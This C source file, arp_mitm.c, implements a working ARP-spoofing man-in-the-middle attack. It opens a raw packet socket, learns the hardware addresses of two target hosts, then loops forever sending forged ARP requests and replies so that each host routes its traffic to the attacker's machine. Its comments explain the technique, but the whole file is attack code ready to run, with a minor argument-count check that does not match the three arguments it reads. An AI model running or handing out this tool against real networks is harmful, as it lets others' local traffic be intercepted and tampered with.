/* arp-spoof/arp_mitm.c */

#include "arp.h"

int main(int argc, char **argv)
{

  /* ARGUMENT PARSING
     - network interface to use
     - target IP address
  */
  
  if (argc < 3) {
    printf("[FAIL] Too few arguments\n"
	   "Usage: %s <interface> <target IP address 1> <target IP address 2>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  char *if_name = argv[1];

  char *target1_ip_string = argv[2];
  struct in_addr target1_ip;
  if (!inet_pton(AF_INET, target1_ip_string, &target1_ip)) {
    perror("[FAIL] inet_pton() (badly formatted IP address)");
    exit(EXIT_FAILURE);
  }

  char *target2_ip_string = argv[3];
  struct in_addr target2_ip;
  if (!inet_pton(AF_INET, target2_ip_string, &target2_ip)) {
    perror("[FAIL] inet_pton() (badly formatted IP address)");
    exit(EXIT_FAILURE);
  }
  printf("ARP man-in-the-middle attack on interface %s between %s and %s\n",
	 if_name, target1_ip_string, target2_ip_string);



  /* ====================================================================== */

  /* RAW SOCKET CREATION */
  
  /* We open the raw socket */
  /* AF_PACKET: This is a raw Ethernet packet (Linux only, requires root)
     SOCK_DGRAM: The link-layer header is constructed automatically
     (to build it ourselves, we could have used SOCK_RAW)
     ETH_P_ALL: We want to listen to every EtherType (here, we could 
     also have chosen ETH_P_ARP) */
  int sockfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
  if (sockfd < 0) {
    perror("[FAIL] socket()");
    exit(EXIT_FAILURE);
  }
#ifdef DEBUG
  printf("[OK] Raw Ethernet socket started successfully\n");
#endif



  
  /* ====================================================================== */

  /* INFORMATION ON THE LOCAL COMPUTER:
     - index number of the network interface
     - local MAC address
  */

  /* Since this is very low-level, we can't use the usual interface
     name (e.g. "eth0"), so we need to get the index number of the
     ethernet interface. */
  struct ifreq ifrindex;
  size_t if_name_len = strlen(if_name);
  if (if_name_len < sizeof(ifrindex.ifr_name)) {
    memcpy(ifrindex.ifr_name, if_name, if_name_len);
    ifrindex.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  /* We use ioctl() with SIOCGIFINDEX */
  if (ioctl(sockfd, SIOCGIFINDEX, &ifrindex) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  int ifindex = ifrindex.ifr_ifindex;
#ifdef DEBUG
  printf("[OK] Index number of the Ethernet interface %s: %d\n", if_name, ifindex);
#endif

  /* We get our IP address using ioctl() and SIOCGIFADDR */
  struct ifreq ifraddr;
  if (if_name_len < sizeof(ifraddr.ifr_name)) {
    memcpy(ifraddr.ifr_name, if_name, if_name_len);
    ifraddr.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  if (ioctl(sockfd, SIOCGIFADDR, &ifraddr) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  struct sockaddr_in *ipaddr = (struct sockaddr_in *) &ifraddr.ifr_addr;
  char local_ip_string[16];
  if (!inet_ntop(AF_INET, &ipaddr->sin_addr, local_ip_string, sizeof(local_ip_string))) {
    perror("[FAIL] inet_ntop()");
    exit(EXIT_FAILURE);
  }
#ifdef DEBUG
  printf("[OK] Local IP address: %s\n", local_ip_string);
#endif

  /* We get the MAC address using ioctl() (again) with SIOCGIFHWADDR */
  struct ifreq ifrhwaddr;
  if (if_name_len < sizeof(ifrhwaddr.ifr_name)) {
    memcpy(ifrhwaddr.ifr_name, if_name, if_name_len);
    ifrhwaddr.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  if (ioctl(sockfd, SIOCGIFHWADDR, &ifrhwaddr) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  unsigned char *macaddr = (unsigned char *) &ifrhwaddr.ifr_hwaddr.sa_data;
#ifdef DEBUG
  printf("[OK] Local MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
	 macaddr[0], macaddr[1], macaddr[2], macaddr[3], macaddr[4], macaddr[5]);
#endif

  /* We build 2 pseudo-local IP addresses to impersonate both
     targets */
  struct sockaddr_in *ipaddr1 = malloc(sizeof(struct sockaddr_in));
  struct sockaddr_in *ipaddr2 = malloc(sizeof(struct sockaddr_in));
  ipaddr1->sin_family = AF_INET;
  ipaddr1->sin_port = htons(5746);
  ipaddr1->sin_addr = target1_ip;
  ipaddr2->sin_family = AF_INET;
  ipaddr2->sin_port = htons(5746);
  ipaddr2->sin_addr = target2_ip;



  /* ====================================================================== */

  send_arp_request(sockfd, ifindex, ipaddr, macaddr, target1_ip);

  struct ether_arp reply1;
  listen_arp_frame(sockfd, &reply1);
  unsigned char *macaddr1 = reply1.arp_sha;
  printf("Target 1 hardware address: %02x:%02x:%02x:%02x:%02x:%02x\n",
    	 macaddr1[0],macaddr1[1],macaddr1[2],
    	 macaddr1[3],macaddr1[4],macaddr1[5]);

  send_arp_request(sockfd, ifindex, ipaddr, macaddr, target2_ip);
  struct ether_arp reply2;
  listen_arp_frame(sockfd, &reply2);
  unsigned char *macaddr2 = reply2.arp_sha;
  printf("Target 2 hardware address: %02x:%02x:%02x:%02x:%02x:%02x\n",
    	 macaddr2[0],macaddr2[1],macaddr2[2],
    	 macaddr2[3],macaddr2[4],macaddr2[5]);

  /* We send ARP requests and replies to both targets, impersonating
     the other. We use both requests and replies because some devices
     (linux > 2.4.x for example) don't update their ARP cache on
     unsolicited replies, but do on queries. */
  while(1) {
    send_arp_request(sockfd, ifindex, ipaddr1, macaddr, target2_ip);
    send_arp_reply(sockfd, ifindex, ipaddr1, macaddr, target2_ip, macaddr2);
    sleep(1);
    send_arp_request(sockfd, ifindex, ipaddr2, macaddr, target1_ip);
    send_arp_reply(sockfd, ifindex, ipaddr2, macaddr, target1_ip, macaddr1);
    sleep(1);
  }

  return EXIT_SUCCESS;
}
